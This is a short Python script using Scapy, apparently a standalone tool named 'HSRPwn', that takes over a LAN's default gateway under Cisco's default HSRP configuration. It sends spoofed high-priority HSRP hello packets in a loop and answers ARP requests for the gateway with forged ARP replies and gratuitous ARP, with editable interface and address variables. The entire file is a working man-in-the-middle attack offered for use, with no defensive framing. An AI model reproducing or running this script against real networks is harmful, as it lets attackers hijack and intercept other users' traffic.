#! /usr/bin/env python

## HSRPwn - become gateway in default Cisco's HSRP configuration
## tAd - o0tAd0o___gmail.com
## v0.1 - 06/02/2014

from scapy.all import *
from multiprocessing import Process

## Vars (to edit)
# Interface connected to LAN
IF="eth1"
# Real interface IP address
IPADDR="192.168.57.10"
# Gateway IP address to takeover
GW_IPADDR="192.168.57.1"
# Gateway MAC address to takeover
GW_HWADDR="00:00:0c:07:ac:0a"

## HSRPwn
def HSRPwn():
	eth = Ether(src=GW_HWADDR)
	ip = IP(src=IPADDR, dst='224.0.0.2')
	udp = UDP()
	hsrp = HSRP(group=10, priority=111, virtualIP=GW_IPADDR)
	sendp(eth/ip/udp/hsrp, iface=IF, inter=2, loop=1)

## Sniffer:
def Sniff():
	def arpmon(pkt):
	    ## if ARP request for our GW MAC Address (op=1)
	    if ARP in pkt and pkt[ARP].op is 1 and pkt[ARP].pdst == GW_IPADDR:
		#pkIPt.show()

		## ARP Reply (op=2)
		sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=GW_HWADDR, type=0x806)/ARP(op=2, hwsrc=GW_HWADDR, hwdst="ff:ff:ff:ff:ff:ff", psrc=GW_IPADDR, pdst=GW_IPADDR)/Padding(load= '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), iface=IF)

		## Gratuitous ARP
		sendp(Ether(dst="01:00:0c:cd:cd:cd", src=GW_HWADDR, type=0x806)/ARP(op=2, hwsrc=GW_HWADDR, hwdst="01:00:0c:cd:cd:cd", psrc=GW_IPADDR, pdst=GW_IPADDR)/Padding(load= '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), iface=IF)

	sniff(prn=arpmon, filter="arp", store=0, iface=IF)

## Parallelization
if __name__ == '__main__':
  p1 = Process(target=HSRPwn)
  p1.start()
  p2 = Process(target=Sniff)
  p2.start()
  p1.join()
  p2.join()
